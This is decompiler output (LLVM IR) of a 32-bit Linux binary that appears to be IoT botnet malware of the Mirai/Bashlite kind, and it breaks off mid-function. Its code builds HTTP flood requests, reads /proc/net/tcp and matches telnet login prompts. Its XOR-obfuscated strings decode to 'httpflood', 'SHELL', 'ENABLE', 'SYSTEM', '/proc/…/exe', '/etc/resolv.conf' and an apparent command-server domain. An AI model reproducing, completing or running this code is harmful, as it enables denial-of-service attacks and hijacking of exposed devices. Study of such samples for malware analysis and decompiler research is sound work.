source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_80571b0.2 = global i32 0
@global_var_80571c8.3 = local_unnamed_addr global i32* @global_var_80571b0.2
@global_var_80554d4.5 = constant [4 x i8] c"GET\00"
@global_var_80554ad.6 = constant i32 1210056751
@global_var_80554df.7 = constant i32 540737568
@global_var_80554af.8 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_80554c7.9 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_80554e6.10 = constant [3 x i8] c"\0D\0A\00"
@global_var_80554d8.11 = constant [9 x i8] c"Cookie: \00"
@global_var_80554e1.12 = constant [3 x i8] c"; \00"
@global_var_80554e4.13 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_80554e9.14 = constant i32 1952972859
@global_var_80554eb.15 = constant [5 x i8] c"http\00"
@global_var_80554fa.16 = constant i32 -1623588825
@global_var_80554f0.17 = constant [5 x i8] c"url=\00"
@global_var_80554f5.18 = constant [5 x i8] c"POST\00"
@global_var_80554f3.19 = constant i32 1330643005
@global_var_8055510.20 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_8057324.21 = local_unnamed_addr global i32 0
@global_var_8057320.22 = local_unnamed_addr global i32 0
@global_var_80572a0.23 = local_unnamed_addr global i32 0
@global_var_80571d4.24 = local_unnamed_addr global i32 134555792
@global_var_80571cc.25 = local_unnamed_addr global i32 -1
@global_var_805731c.27 = local_unnamed_addr global i32 0
@global_var_805732c.28 = local_unnamed_addr global i32 0
@global_var_805732a.29 = local_unnamed_addr global i32 0
@global_var_80572a8.30 = local_unnamed_addr global i32 0
@global_var_80572b4.31 = local_unnamed_addr global i32 0
@global_var_80572ac.32 = local_unnamed_addr global i32 0
@global_var_80572b0.33 = local_unnamed_addr global i32 0
@global_var_80572f0.34 = local_unnamed_addr global i32 0
@global_var_80572ca.35 = local_unnamed_addr global i32 0
@global_var_80572d0.36 = local_unnamed_addr global i32 0
@global_var_80572c0.37 = global i32 0
@global_var_80572d8.39 = local_unnamed_addr global i32 0
@global_var_80572e4.40 = local_unnamed_addr global i32 0
@global_var_80572d4.41 = global i32 0
@global_var_805733c.42 = local_unnamed_addr global i32 0
@global_var_80572c4.43 = local_unnamed_addr global i32 0
@global_var_80572cc.44 = local_unnamed_addr global i32 0
@global_var_8057338.45 = local_unnamed_addr global i32 0
@global_var_80556e5.46 = constant [5 x i8] c"ogin\00"
@global_var_80556ea.47 = constant [6 x i8] c"enter\00"
@global_var_80556f0.48 = constant [8 x i8] c"assword\00"
@global_var_80572b8.50 = local_unnamed_addr global i32 0
@global_var_80572e8.51 = local_unnamed_addr global i32 0
@global_var_8057360.52 = global i32 0
@global_var_8055724.54 = constant [13 x i8] c"RKAGQ@PM\0CVI\22\00"
@global_var_8057378.55 = local_unnamed_addr global i32 0
@global_var_805737c.56 = local_unnamed_addr global i32 0
@global_var_8055731.57 = constant i32 -1644124382
@global_var_8057380.58 = local_unnamed_addr global i32 0
@global_var_8057384.59 = local_unnamed_addr global i32 0
@global_var_80573f0.60 = local_unnamed_addr global i32 0
@global_var_80573f4.61 = local_unnamed_addr global i32 0
@global_var_8055734.62 = constant i32 1308659102
@global_var_80573f8.63 = local_unnamed_addr global i32 0
@global_var_80573fc.64 = local_unnamed_addr global i32 0
@global_var_8055737.65 = constant i32 1448168270
@global_var_8057370.66 = local_unnamed_addr global i32 0
@global_var_8057374.67 = local_unnamed_addr global i32 0
@global_var_8055747.68 = constant i32 1381389898
@global_var_8057388.69 = local_unnamed_addr global i32 0
@global_var_805738c.70 = local_unnamed_addr global i32 0
@global_var_8055765.71 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_8057390.72 = local_unnamed_addr global i32 0
@global_var_8057394.73 = local_unnamed_addr global i32 0
@global_var_805576d.74 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_8057398.75 = local_unnamed_addr global i32 0
@global_var_805739c.76 = local_unnamed_addr global i32 0
@global_var_8055773.77 = constant i32 1195772418
@global_var_80573a0.78 = local_unnamed_addr global i32 0
@global_var_80573a4.79 = local_unnamed_addr global i32 0
@global_var_805577f.80 = constant [5 x i8] c"\0DDF\22\00"
@global_var_80573a8.81 = local_unnamed_addr global i32 0
@global_var_80573ac.82 = local_unnamed_addr global i32 0
@global_var_8055784.83 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_80573b0.84 = local_unnamed_addr global i32 0
@global_var_80573b4.85 = local_unnamed_addr global i32 0
@global_var_805578c.86 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_80573b8.87 = local_unnamed_addr global i32 0
@global_var_80573bc.88 = local_unnamed_addr global i32 0
@global_var_8055795.89 = constant i32 1836214128
@global_var_80573c0.90 = local_unnamed_addr global i32 0
@global_var_80573c4.91 = local_unnamed_addr global i32 0
@global_var_80557a3.92 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_80573c8.93 = local_unnamed_addr global i32 0
@global_var_80573cc.94 = local_unnamed_addr global i32 0
@global_var_80557ae.95 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_80573d0.96 = local_unnamed_addr global i32 0
@global_var_80573d4.97 = local_unnamed_addr global i32 0
@global_var_805592c.98 = constant i32 437738110
@global_var_80573d8.99 = local_unnamed_addr global i32 0
@global_var_80573dc.100 = local_unnamed_addr global i32 0
@global_var_80557b9.101 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_80573e0.102 = local_unnamed_addr global i32 0
@global_var_80573e4.103 = local_unnamed_addr global i32 0
@global_var_80557c2.104 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_80573e8.105 = local_unnamed_addr global i32 0
@global_var_80573ec.106 = local_unnamed_addr global i32 0
@global_var_80557ce.107 = constant [7 x i8] c"QJGNN\22\00"
@global_var_8057400.108 = local_unnamed_addr global i32 0
@global_var_8057404.109 = local_unnamed_addr global i32 0
@global_var_80557d5.110 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_8057408.111 = local_unnamed_addr global i32 0
@global_var_805740c.112 = local_unnamed_addr global i32 0
@global_var_80557dd.113 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_8057410.114 = local_unnamed_addr global i32 0
@global_var_8057414.115 = local_unnamed_addr global i32 0
@global_var_80557e5.116 = constant [4 x i8] c"QJ\22\00"
@global_var_8057418.117 = local_unnamed_addr global i32 0
@global_var_805741c.118 = local_unnamed_addr global i32 0
@global_var_80557e9.119 = constant i32 1280000013
@global_var_8057420.120 = local_unnamed_addr global i32 0
@global_var_8057424.121 = local_unnamed_addr global i32 0
@global_var_80557fd.122 = constant i32 1668311919
@global_var_8057428.123 = local_unnamed_addr global i32 0
@global_var_805742c.124 = local_unnamed_addr global i32 0
@global_var_8055816.125 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_8057430.126 = local_unnamed_addr global i32 0
@global_var_8057434.127 = local_unnamed_addr global i32 0
@global_var_8055820.128 = constant i32 1280000013
@global_var_8057438.129 = local_unnamed_addr global i32 0
@global_var_805743c.130 = local_unnamed_addr global i32 0
@global_var_8055831.131 = constant i32 1280000013
@global_var_8057440.132 = local_unnamed_addr global i32 0
@global_var_8057444.133 = local_unnamed_addr global i32 0
@global_var_8055848.134 = constant i32 1464693110
@global_var_8057448.135 = local_unnamed_addr global i32 0
@global_var_805744c.136 = local_unnamed_addr global i32 0
@global_var_805585e.137 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_8057450.138 = local_unnamed_addr global i32 0
@global_var_8057454.139 = local_unnamed_addr global i32 0
@global_var_8055870.140 = constant i32 1196376908
@global_var_8057458.141 = local_unnamed_addr global i32 0
@global_var_805745c.142 = local_unnamed_addr global i32 0
@global_var_805587d.143 = constant i32 1280068961
@global_var_8057460.144 = local_unnamed_addr global i32 0
@global_var_8057464.145 = local_unnamed_addr global i32 0
@global_var_8055950.146 = constant i32 1195458915
@global_var_8057468.147 = local_unnamed_addr global i32 0
@global_var_805746c.148 = local_unnamed_addr global i32 0
@global_var_80559a4.149 = constant i32 1195458915
@global_var_8057470.150 = local_unnamed_addr global i32 0
@global_var_8057474.151 = local_unnamed_addr global i32 0
@global_var_80559c8.152 = constant i32 1447841121
@global_var_8057478.153 = local_unnamed_addr global i32 0
@global_var_805747c.154 = local_unnamed_addr global i32 0
@global_var_8055895.155 = constant i32 1633044305
@global_var_8057480.156 = local_unnamed_addr global i32 0
@global_var_8057484.157 = local_unnamed_addr global i32 0
@global_var_80558a2.158 = constant i32 1346651984
@global_var_8057488.159 = local_unnamed_addr global i32 0
@global_var_805748c.160 = local_unnamed_addr global i32 0
@global_var_80558ac.161 = constant i32 1128353102
@global_var_8057490.162 = local_unnamed_addr global i32 0
@global_var_8057494.163 = local_unnamed_addr global i32 0
@global_var_80558b7.164 = constant i32 257312593
@global_var_8057498.165 = local_unnamed_addr global i32 0
@global_var_805749c.166 = local_unnamed_addr global i32 0
@global_var_80558c4.167 = constant i32 1447841089
@global_var_80574a0.168 = local_unnamed_addr global i32 0
@global_var_80574a4.169 = local_unnamed_addr global i32 0
@global_var_80558d5.170 = constant i32 1279479894
@global_var_80574a8.171 = local_unnamed_addr global i32 0
@global_var_80574ac.172 = local_unnamed_addr global i32 0
@global_var_80558e9.173 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_80574b0.174 = local_unnamed_addr global i32 0
@global_var_80574b4.175 = local_unnamed_addr global i32 0
@global_var_8055889.176 = constant i32 1380403017
@global_var_80574b8.177 = local_unnamed_addr global i32 0
@global_var_80574bc.178 = local_unnamed_addr global i32 0
@global_var_80558f2.179 = constant i32 1280068929
@global_var_80574c0.180 = local_unnamed_addr global i32 0
@global_var_80574c4.181 = local_unnamed_addr global i32 0
@global_var_80558ff.182 = constant i32 1414547281
@global_var_80574c8.183 = local_unnamed_addr global i32 0
@global_var_80574cc.184 = local_unnamed_addr global i32 0
@global_var_8055912.185 = constant i32 1414547281
@global_var_80574d0.186 = local_unnamed_addr global i32 0
@global_var_80574d4.187 = local_unnamed_addr global i32 0
@global_var_80559fc.188 = constant i32 1264078191
@global_var_80574d8.189 = local_unnamed_addr global i32 0
@global_var_80574dc.190 = local_unnamed_addr global i32 0
@global_var_8055a6c.191 = constant i32 1264078191
@global_var_80574e0.192 = local_unnamed_addr global i32 0
@global_var_80574e4.193 = local_unnamed_addr global i32 0
@global_var_8055adc.194 = constant i32 1264078191
@global_var_80574e8.195 = local_unnamed_addr global i32 0
@global_var_80574ec.196 = local_unnamed_addr global i32 0
@global_var_8055b4c.197 = constant i32 1264078191
@global_var_80574f0.198 = local_unnamed_addr global i32 0
@global_var_80574f4.199 = local_unnamed_addr global i32 0
@global_var_8055bbc.200 = constant i32 1264078191
@global_var_80574f8.201 = local_unnamed_addr global i32 0
@global_var_80574fc.202 = local_unnamed_addr global i32 0
@global_var_8057314.203 = global i32 0
@global_var_8057500.204 = global i32 0
@global_var_80571e0.205 = global i32 0
@global_var_80575ac.207 = global i32 0
@global_var_80575b0.208 = local_unnamed_addr global i32 0
@global_var_80575b4.209 = global i32 0
@global_var_80575c0.210 = local_unnamed_addr global i32 0
@global_var_80578b4.211 = global i32 0
@global_var_80578dc.212 = local_unnamed_addr global i32 0
@global_var_80578cc.213 = local_unnamed_addr global i32 0
@global_var_80578d0.214 = local_unnamed_addr global i32 0
@global_var_80578d4.215 = local_unnamed_addr global i32 0
@global_var_80578d8.216 = local_unnamed_addr global i32 0
@global_var_80578e4.217 = local_unnamed_addr global i32 0
@global_var_80578f0.218 = local_unnamed_addr global i32 0
@global_var_80578e8.219 = local_unnamed_addr global i32 0
@global_var_80578f4.220 = local_unnamed_addr global i32 0
@global_var_80578c8.221 = local_unnamed_addr global i32 0
@global_var_80578c4.223 = local_unnamed_addr global i32 0
@global_var_80578ec.224 = local_unnamed_addr global i32 0
@global_var_80575bc.225 = local_unnamed_addr global i32 0
@global_var_80571f8.226 = global i32 0
@global_var_8055fa0.228 = constant i32 33554944
@global_var_805722c.229 = local_unnamed_addr global i32* @global_var_8055fa0.228
@global_var_8057210.230 = global i32 0
@global_var_80572f8.231 = local_unnamed_addr global i32 0
@global_var_80571a4.233 = global i32 -1
@global_var_8054a59.234 = constant i32 -294069
@global_var_8057308.235 = local_unnamed_addr global i32 0
@global_var_805730c.236 = local_unnamed_addr global i32 0
@global_var_8055e8c.237 = constant [10 x i8] c"/dev/null\00"
@global_var_8057304.239 = local_unnamed_addr global i32 0
@global_var_80572fc.240 = local_unnamed_addr global i32 0
@global_var_8057300.241 = local_unnamed_addr global i32 0
@global_var_80554e8.242 = constant i32 1744845568
@global_var_8057228.243 = local_unnamed_addr global i32* @global_var_80554e8.242
@global_var_8054c3f.244 = constant i32 1928542531
@global_var_8054c63.245 = constant i32 1928542531
@global_var_8057318.246 = local_unnamed_addr global i32 0
@global_var_80578f8.247 = local_unnamed_addr global i32 0
@global_var_80578fc.248 = local_unnamed_addr global i32 0
@global_var_8057240.1 = local_unnamed_addr global i8 0
@global_var_80571d8.26 = local_unnamed_addr global i8 1
@global_var_80572d6.38 = local_unnamed_addr global i16 0
@global_var_80572ec.49 = local_unnamed_addr global i16 0
@global_var_80571dc.53 = local_unnamed_addr global i16 -16657
@global_var_8057580.206 = global i8 0
@global_var_80578e0.222 = local_unnamed_addr global i8 0
@global_var_80572f4.227 = local_unnamed_addr global i8 0
@global_var_8057310.238 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 61723
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8055460()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_8057240.1, align 64
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_80571c8.3 to i32*), align 8
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_80571c8.3 to i32*), align 8
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_80571c8.3 to i32*), align 8
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8057240.1, align 64
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_80571c8.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8057240.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134570400)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* inttoptr (i32 134574516 to i32*), align 4
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i8 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20900 = alloca i8*, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-20825 = alloca i32, align 4
  %stack_var_-20972 = alloca i32, align 4
  %stack_var_-20956 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v3_8048166 = sext i8 %arg1 to i32
  store i32 %v3_8048166, i32* @esi, align 4
  %v5_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v5_8048166, i32* @ecx, align 4
  %v2_8048169 = icmp ult i32* %stack_var_4, inttoptr (i32 16 to i32*)
  store i1 %v2_8048169, i1* %zf.global-to-local, align 1
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v11_8048180 = call i32 @function_8054af5(i32 134541216, i32 %v3_8048166, i32* nonnull %stack_var_4, i32 -108, i32 134567046, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  %v0_8048191 = load i32, i32* @edi, align 4
  %v0_8048192 = load i32, i32* @esi, align 4
  %v0_8048193 = load i32, i32* @ebx, align 4
  %v15_8048194 = ptrtoint i32* %stack_var_-20956 to i32
  store i32 134567046, i32* @ebx, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 148, i32* %eax.global-to-local, align 4
  store i32 %v3_8048166, i32* @ebp, align 4
  store i32 148, i32* @esi, align 4
  store i32 148, i32* %stack_var_-20972, align 4
  %v5_80481bd = call i32 @function_804a0a0(i8 -108, i32 134567046, i32 21, i32 0)
  store i32 %v5_80481bd, i32* %eax.global-to-local, align 4
  %v0_80481cd = load i32, i32* @ebx, align 4
  %v0_80481ce = load i32, i32* @esi, align 4
  %v5_80481cf = trunc i32 %v0_80481ce to i8
  %v6_80481cf = call i32 @function_804a0a0(i8 %v5_80481cf, i32 %v0_80481cd, i32 20, i32 ptrtoint ([4 x i8]* @global_var_80554d4.5 to i32))
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  %tmp135 = bitcast i8** %stack_var_-20900 to i32*
  store i32 %v6_80481cf, i32* %tmp135, align 4
  %v0_80481d8 = load i32, i32* @esp, align 4
  %v6_80481d8 = icmp eq i32 %v0_80481d8, -32
  store i1 %v6_80481d8, i1* %zf.global-to-local, align 1
  %v0_80481df = load i32, i32* @ebx, align 4
  %v0_80481e0 = load i32, i32* @esi, align 4
  store i32 %v0_80481e0, i32* %stack_var_-20972, align 4
  %v4_80481e1 = trunc i32 %v0_80481e0 to i8
  %v5_80481e1 = call i32 @function_804a0a0(i8 %v4_80481e1, i32 %v0_80481df, i32 8, i32 0)
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  %v0_80481f1 = load i32, i32* @ebx, align 4
  %v0_80481f2 = load i32, i32* @esi, align 4
  %v5_80481f3 = trunc i32 %v0_80481f2 to i8
  %v6_80481f3 = call i32 @function_804a0a0(i8 %v5_80481f3, i32 %v0_80481f1, i32 22, i32 ptrtoint (i32* @global_var_80554ad.6 to i32))
  store i32 %v6_80481f3, i32* @eax, align 4
  %v0_80481fc = load i32, i32* @esp, align 4
  %v6_80481fc = icmp eq i32 %v0_80481fc, -32
  store i1 %v6_80481fc, i1* %zf.global-to-local, align 1
  %v0_8048203 = load i32, i32* @ebx, align 4
  %v0_8048204 = load i32, i32* @esi, align 4
  store i32 %v0_8048204, i32* %stack_var_-20972, align 4
  %v4_8048205 = trunc i32 %v0_8048204 to i8
  %v5_8048205 = call i32 @function_804a600(i8 %v4_8048205, i32 %v0_8048203, i32 24, i32 1)
  store i32 %v5_8048205, i32* @eax, align 4
  store i32 %v5_8048205, i32* @edi, align 4
  %v0_8048210 = load i32, i32* @ebx, align 4
  %v0_8048211 = load i32, i32* @esi, align 4
  %v5_8048212 = trunc i32 %v0_8048211 to i8
  %v6_8048212 = call i32 @function_804a600(i8 %v5_8048212, i32 %v0_8048210, i32 7, i32 80)
  store i32 %v6_8048212, i32* %eax.global-to-local, align 4
  %v0_804821c = load i32, i32* @esp, align 4
  %v9_804821c = icmp eq i32 %v0_804821c, -28
  store i1 %v9_804821c, i1* %zf.global-to-local, align 1
  %v2_8048226 = ptrtoint i32* %stack_var_-20825 to i32
  store i32 %v2_8048226, i32* %edx.global-to-local, align 4
  store i32 %v2_8048226, i32* %stack_var_-20972, align 4
  %v3_804822e = bitcast i32* %stack_var_-20825 to i8*
  %v4_804822e = call i32 @function_805314a(i8* %v3_804822e, i32 0, i32 10241)
  store i32 %v4_804822e, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %ecx.global-to-local, align 4
  %v1_804823a = icmp eq i32 %v5_80481e1, 0
  store i1 %v1_804823a, i1* %zf.global-to-local, align 1
  %tmp237 = inttoptr i32 %v6_80481cf to i8*
  br i1 %v1_804823a, label %dec_label_pc_804825d, label %dec_label_pc_804823e

dec_label_pc_804823e:                             ; preds = %entry
  store i32 %v6_80481f3, i32* %edx.global-to-local, align 4
  %v1_8048242 = icmp eq i32 %v6_80481f3, 0
  store i1 %v1_8048242, i1* %zf.global-to-local, align 1
  br i1 %v1_8048242, label %dec_label_pc_804825d, label %dec_label_pc_8048246

dec_label_pc_8048246:                             ; preds = %dec_label_pc_804823e
  %v9_8048246 = icmp eq i32* %stack_var_-20956, inttoptr (i32 12 to i32*)
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481f3, i32* %eax.global-to-local, align 4
  store i32 %v6_80481f3, i32* %stack_var_-20972, align 4
  %v1_804824e = inttoptr i32 %v6_80481f3 to i8*
  %v2_804824e = call i32 @function_8052620(i8* %v1_804824e)
  store i32 %v2_804824e, i32* %eax.global-to-local, align 4
  %v10_8048256 = icmp eq i32 %v2_804824e, 255
  store i1 %v10_8048256, i1* %zf.global-to-local, align 1
  %v7_804825b = icmp sgt i32 %v2_804824e, 255
  br i1 %v7_804825b, label %dec_label_pc_804825d, label %dec_label_pc_8048268

dec_label_pc_804825d:                             ; preds = %dec_label_pc_8048246, %dec_label_pc_804827d, %dec_label_pc_8048268, %dec_label_pc_804823e, %entry
  %v0_8048267 = phi i32 [ %v2_804824e, %dec_label_pc_8048246 ], [ %v2_8048285, %dec_label_pc_804827d ], [ %v2_8048270, %dec_label_pc_8048268 ], [ %v4_804822e, %dec_label_pc_804823e ], [ %v4_804822e, %entry ]
  %v9_804825d = icmp eq i32* %stack_var_-20956, inttoptr (i32 -20908 to i32*)
  store i1 %v9_804825d, i1* %zf.global-to-local, align 1
  store i32 %v0_8048193, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %v0_8048192, 16777216
  %v3_8048264 = sdiv i32 %sext, 16777216
  store i32 %v3_8048264, i32* %esi.global-to-local, align 4
  store i32 %v0_8048191, i32* %edi.global-to-local, align 4
  ret i32 %v0_8048267

dec_label_pc_8048268:                             ; preds = %dec_label_pc_8048246
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %stack_var_-20972, align 4
  %v1_8048270 = inttoptr i32 %v5_80481e1 to i8*
  %v2_8048270 = call i32 @function_8052620(i8* %v1_8048270)
  store i32 %v2_8048270, i32* %eax.global-to-local, align 4
  %v1_8048278 = add i32 %v2_8048270, -127
  %v6_8048278 = sub i32 126, %v2_8048270
  %v7_8048278 = and i32 %v6_8048278, %v2_8048270
  %v8_8048278 = icmp slt i32 %v7_8048278, 0
  %v9_8048278 = icmp eq i32 %v1_8048278, 0
  store i1 %v9_8048278, i1* %zf.global-to-local, align 1
  %v10_8048278 = icmp slt i32 %v1_8048278, 0
  %v3_804827b = icmp eq i1 %v10_8048278, %v8_8048278
  %v4_804827b = icmp eq i1 %v9_8048278, false
  %v5_804827b = and i1 %v4_804827b, %v3_804827b
  br i1 %v5_804827b, label %dec_label_pc_804825d, label %dec_label_pc_804827d

dec_label_pc_804827d:                             ; preds = %dec_label_pc_8048268
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_8048285 = call i32 @function_8052620(i8* %tmp237)
  store i32 %v2_8048285, i32* %eax.global-to-local, align 4
  %v1_804828d = add i32 %v2_8048285, -9
  %v6_804828d = sub i32 8, %v2_8048285
  %v7_804828d = and i32 %v6_804828d, %v2_8048285
  %v8_804828d = icmp slt i32 %v7_804828d, 0
  %v9_804828d = icmp eq i32 %v1_804828d, 0
  store i1 %v9_804828d, i1* %zf.global-to-local, align 1
  %v10_804828d = icmp slt i32 %v1_804828d, 0
  %v3_8048290 = icmp eq i1 %v10_804828d, %v8_804828d
  %v4_8048290 = icmp eq i1 %v9_804828d, false
  %v5_8048290 = and i1 %v4_8048290, %v3_8048290
  br i1 %v5_8048290, label %dec_label_pc_804825d, label %dec_label_pc_804829d.preheader

dec_label_pc_804829d.preheader:                   ; preds = %dec_label_pc_804827d
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_80482a5211 = call i32 @function_8052620(i8* %tmp237)
  store i32 %v2_80482a5211, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v12_80482b4212 = icmp eq i32 %v2_80482a5211, 0
  store i1 %v12_80482b4212, i1* %zf.global-to-local, align 1
  %v7_80482b6213 = icmp sgt i32 %v2_80482a5211, 0
  br i1 %v7_80482b6213, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482b8:                             ; preds = %dec_label_pc_804829d.preheader, %dec_label_pc_80482cc
